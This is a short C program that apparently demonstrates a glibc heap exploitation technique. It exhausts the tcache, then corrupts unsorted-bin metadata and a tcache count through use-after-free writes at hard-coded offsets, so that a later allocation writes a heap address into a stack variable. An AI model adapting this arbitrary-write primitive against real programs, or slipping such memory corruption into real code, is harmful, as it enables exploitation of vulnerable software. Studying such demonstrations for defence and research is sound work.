#include <stdio.h>
#include <stdlib.h>
int main(){
	int *a[7];
	unsigned long stack_var = 0;
	unsigned long *unsor0,*unsor1,*prevent0,*prevent1;
	for(int i=0;i<7;i++){
		a[i] = malloc(0x400);	
	}
	unsor0 = malloc(0x400);
	prevent0 = malloc(0x80);
	unsor1 = malloc(0x400);
	prevent1 = malloc(0x80);
	for(int i=0;i<7;i++){
		free(a[i]);
		a[i] = NULL;	
	}
	free(unsor0);
	free(unsor1);
	printf("The stack_var's addr is %p,var is %ld\n",&stack_var,stack_var);
	printf("heap addr is %p\n",unsor0-0x1ec0/8-2+9);
	memcpy(unsor0-0x1ec0/8-2+9,"\xff\xff\xff\xff\xff\xff\xff\xff",0x8);
	unsor0[1] = (unsigned long)(&stack_var -2);
	
	for(int i=0;i<6;i++){
		a[i] = malloc(0x400);	
	}
	unsor0 = malloc(0x400);
	printf("The stack_var's addr is %p,var is %p\n",&stack_var,stack_var);
	
	return 0;
}
